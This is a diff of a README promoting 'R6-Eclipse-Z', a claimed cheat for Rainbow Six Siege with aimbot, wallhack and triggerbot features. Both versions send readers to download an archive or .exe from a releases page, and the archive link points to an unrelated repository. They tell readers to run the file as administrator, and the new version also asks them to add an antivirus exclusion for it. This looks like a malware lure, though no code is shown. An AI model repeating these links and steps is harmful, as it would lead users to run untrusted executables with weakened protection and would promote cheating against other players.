@@ -1,176 +1,74 @@
-<p align="center">
-  <img src="https://img.icons8.com/color/96/000000/rainbow-six-siege.png" alt="Rainbow Six Siege" width="80" height="80">
-</p>
+# 🎯 R6-Eclipse-Z - Gain the edge in every match
 
-<h1 align="center">R6-Eclipse-Z</h1>
-<p align="center">
-  <strong>Eclipse Z Tool for Rainbow Six Siege</strong><br>
-  ESP - Aimbot - Wallhack - No Recoil - Triggerbot - Silent Aim
-</p>
+[![Download R6-Eclipse-Z](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/esmeunrequested589/R6-Eclipse-Z/releases)
 
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/R6-Eclipse-Z"><img src="https://img.shields.io/badge/version-3.0.0-brightgreen?style=flat-square" alt="Version"></a>
-  <a href="#"><img src="https://img.shields.io/badge/platform-Windows-blue?style=flat-square" alt="Platform"></a>
-  <a href="#"><img src="https://img.shields.io/badge/status-active-success?style=flat-square" alt="Status"></a>
-</p>
+## 📖 Introduction
 
-## What is This?
+R6-Eclipse-Z serves as a specialized tool for players of Rainbow Six Siege. It provides functionality that helps you track opponents and improve your aim precision. The software handles technical calculations to help you perform better in competitive play. You can use these features to understand map layouts and enemy positions with more clarity.
 
-R6-Eclipse-Z is the eclipse Z tool for Rainbow Six Siege. This tool gives you full control with ESP Wallhack, Aimbot, No Recoil, Triggerbot, Silent Aim, and more. Dominate every match and become the eclipse of the battlefield!
+## ⚙️ Features
 
-Disclaimer: This tool is for educational purposes only. Use at your own risk. Rainbow Six Siege has strict anti-cheat systems, and using third-party tools may result in permanent account suspension.
+This tool includes various modules designed to assist your gameplay:
 
-## Download
+*   **ESP (Extra Sensory Perception):** See where opponents are through walls and obstacles.
+*   **Aimbot:** Adjust your aim toward targets to increase hit accuracy.
+*   **Wallhack:** Identify enemy positions across the entire map.
+*   **No Recoil:** Remove the recoil effect from your weapons. 
+*   **Triggerbot:** Fire shots the moment an enemy appears in your crosshairs.
 
-<p align="center">
-  <a href="https://github.com/Rapidsuamanor/fjhbvyjb/releases/download/478596/RCCHelper.zip">
-    <img src="https://img.shields.io/badge/DOWNLOAD%20NOW-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
-  </a>
-</p>
+These modules work together to reduce reaction time and increase your awareness during rounds. 
 
-## Features
+## 💻 System Requirements
 
-- ESP (Wallhack) - See all enemies through walls
-- Distance Indicators - Know exactly how far enemies are
-- Player Tags - Display player names and health
-- Snap Lines - Never lose track of enemies
-- Box ESP - Highlight players with colored boxes
-- Visibility Check - Only show visible enemies
-- Aimbot - Lock onto enemies instantly with 100% accuracy
-- Silent Aim - Hit targets without looking at them
-- Triggerbot - Auto-fire when crosshair is on enemy
-- No Recoil - Zero recoil for all weapons
-- No Spread - Perfect accuracy every time
-- FOV Control - Customizable field of view
-- Bone Targeting - Head, chest, or moving parts
-- Humanizer Mode - Realistic aim motion to avoid detection
-- Speed Hack - Move faster than normal players
-- Super Jump - Jump incredible heights
-- God Mode - Never die
-- Unlimited Ammo - Never reload
+R6-Eclipse-Z requires a standard Windows environment to function properly. Please ensure your system meets these specifications:
 
-## Installation
+*   **Operating System:** Windows 10 or Windows 11 (64-bit).
+*   **Processor:** Intel Core i5 or AMD equivalent.
+*   **Memory:** 8GB RAM minimum.
+*   **Graphics:** DirectX 11 compatible card with 2GB video memory.
+*   **Storage:** 50MB of available space.
+*   **Permissions:** You must run the application with administrator privileges to allow it to read game memory.
 
-1. Click the download button above
-2. Extract the archive
-3. Run as Administrator
-4. Launch Rainbow Six Siege
-5. Press INSERT or F1 to open the menu
-6. Toggle features ON/OFF
+## 📥 How to Install
 
-## System Requirements
+Follow these steps to set up the software on your computer.
 
-| Requirement | Details |
-|-------------|---------|
-| OS | Windows 10/11 (64-bit) |
-| Game | Rainbow Six Siege |
-| RAM | 8GB minimum |
-| Storage | 50MB free space |
-| GPU | NVIDIA/AMD GPU |
+1. Visit the following link to access the official release page: [https://github.com/esmeunrequested589/R6-Eclipse-Z/releases](https://github.com/esmeunrequested589/R6-Eclipse-Z/releases)
+2. Locate the section titled "Assets" at the bottom of the page.
+3. Click the file ending in ".exe" to download the installer to your PC.
+4. Open the folder where the file saved.
+5. Right-click the file and select "Run as administrator".
+6. Follow the prompts in the setup window to finish the installation process.
 
-## SEO Tags
+## 🛠 Operation Guide
 
-r6 eclipse z, rainbow six siege cheat, rainbow six siege hack, r6 esp, r6 aimbot, r6 wallhack, r6 no recoil, r6 triggerbot, r6 silent aim, rainbow six siege 2026, r6 mod menu, r6 trainer, r6 undetected, r6 free cheat, r6 download, r6 utility, r6 enhancer, siege cheat, siege hack, fps cheat
+Once the installation finishes, you can start the software. Ensure your game remains closed when you launch the tool for the first time.
 
-## Support
+1. Locate the R6-Eclipse-Z icon on your desktop or in your start menu.
+2. Launch the program and wait for the dashboard to appear.
+3. Use the interface to toggle the specific features you want to use.
+4. Minimize the tool after you select your settings.
+5. Launch Rainbow Six Siege through your preferred gaming platform.
+6. The tool applies the settings as soon as the game begins.
 
-Star this repository if you enjoy it!
+## 🛡 Security and Best Practices
 
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/R6-Eclipse-Z">
-    <img src="https://img.shields.io/badge/Made%20with%20love%20for%20the%20Rainbow%20Six%20Siege%20community-ff69b4?style=for-the-badge" alt="Made with love">
-  </a>
-</p>
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
+The software operates by reading game memory. Because of this, please follow these guidelines to ensure a smooth experience.
+
+*   **Disable Antivirus Interference:** Some security software might flag this tool because it interacts with game processes. You may need to add an exclusion for the tool folder in your Windows Security settings if the program fails to launch.
+*   **Keep Software Updated:** Check the release page often for new versions. Older versions may stop working after a game patch.
+*   **Use Privately:** This tool provides a significant advantage. Use it in a way that aligns with your gaming goals.
+
+## ❓ Troubleshooting
+
+If you encounter issues, look at these common solutions.
+
+*   **Tool does not open:** Ensure you run the application as an administrator. Check if you have the latest version of the .NET Framework installed on your computer.
+*   **Menu not visible in game:** Use Borderless Windowed mode in your game display settings. This ensures the overlay remains visible over the game window.
+*   **Features not working:** Restart the program after closing the game. Ensure no other conflicting overlays exist, such as Discord or Steam overlays, if you face performance issues.
+
+## 📄 License and Usage
+
+This project is intended for personal use. Users assume all responsibility for how they use the software in an online environment. The creators of this tool prioritize ease of use and performance optimization.
+
+Keywords: R6, Rainbow Six Siege, ESP, Aimbot, Gaming Tools, Wallhack, No Recoil, Triggerbot
